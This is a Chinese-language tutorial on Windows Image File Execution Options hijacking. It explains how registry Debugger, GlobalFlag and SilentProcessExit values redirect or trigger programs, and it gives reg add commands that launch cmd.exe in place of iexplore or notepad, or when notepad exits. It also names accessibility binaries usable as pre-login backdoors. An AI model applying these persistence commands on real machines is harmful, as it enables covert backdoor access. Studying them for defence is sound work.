原创： safe6 合天智汇

## 一，什么是映像劫持（IFEO）？  

所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection
Hijack），它和“映像劫持”（Image Hijack，或IFEO
Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。

了解更多操作，上合天网安实验室！

数据流重定向

  
实验:数据流重定向(合天网安实验室)​www.hetianlab.com![图标](https://pic2.zhimg.com/v2-e36c5909eead6935c85ff8cba6ed7ab1_180x120.jpg)

## 二，映像劫持利用  

1，后门持久化,可以实现系统在未登录状态下，通过快捷键运行自己的程序。（比如按5下shift出现的粘滞键Sethc.exe，还有Windows +
U组合键时启动的utilman.exe程序）

更多如下

  * 屏幕键盘： C:\Windows\System32\osk.exe  

  * 放大镜： C:\Windows\System32\Magnify.exe  

  * 旁白： C:\Windows\System32\Narrator.exe  

  * 显示切换器 C:\Windows\System32\DisplaySwitch.exe  

  * 应用切换器： C:\Windows\System32\AtBroker.exe  

2，提权利用：比如拿到了数据库的root，sa权限也可以尝试一下映像劫持（有时候往往会出奇效）

3，欢迎各位补充。

## 三，实战操作  

3.1劫持ie打开cmd

1.在注册表

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
Execution Options该注册表项建立一个子键，名字是你想劫持的程序，比如
iexplore.exe（不用设置路径，这样设置后你系统里所有的名为iexplore.exe的可执行文件都会被劫持）2.
给刚加的子键添加一个字符串值（应该称为该子键的属性），名字为Debugger，值为你想运行起来的程序，比如 cmd.exe(程序完整路径)

![v2-51778da4fcc334786936a485124d4961_hd.j](https://pic4.zhimg.com/80/v2-51778da4fcc334786936a485124d4961_hd.jpg)

3\. 打开ie浏览器，这个时候会发现cmd启动了。

![v2-08f5f8372eb0d10431504d68562f4ca4_hd.j](https://pic4.zhimg.com/80/v2-08f5f8372eb0d10431504d68562f4ca4_hd.jpg)

有一些病毒利用系统的这一特性，让运行杀毒软件程序的操作变成了再次执行病毒体，而一些病毒会在系统不同目录存在多个副本，利用映像劫持劫持不同的程序，指向不同的副本路径，这也是一些病毒被杀死进程删除单个病毒体后又能重新复活的原因之一。

也可以直接用命令：

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
Execution Options\notepad.exe" /v Debugger/t REG_SZ /d
C:\WINDOWS\system32\cmd.exe

3.2劫持notepad在退出的时候打开cmd

在CurrentVersion注册一个GlobalFlag

![v2-f0d144105d482570bc8e13a3d689d6bb_hd.j](https://pic4.zhimg.com/80/v2-f0d144105d482570bc8e13a3d689d6bb_hd.jpg)

在SilentProcessExit注册一个ReportingMode和一个MonitorProcess

![v2-8839b65c9960fce51c5f9ea5657717fc_hd.j](https://pic3.zhimg.com/80/v2-8839b65c9960fce51c5f9ea5657717fc_hd.jpg)

最后在退出notepad的时候我们发现cmd启动了（此处省略动图，自行脑补）

直接上命令

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512reg add
"HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD
/d 1reg add "HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d
"C:\Windows\System32\cmd.exe"

Ps:reg命令请看参考

参考

https://baike.baidu.com/item/%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81IFEO/8522843?fr=aladdin

https://www.cnblogs.com/fanyf/p/4221488.html

https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

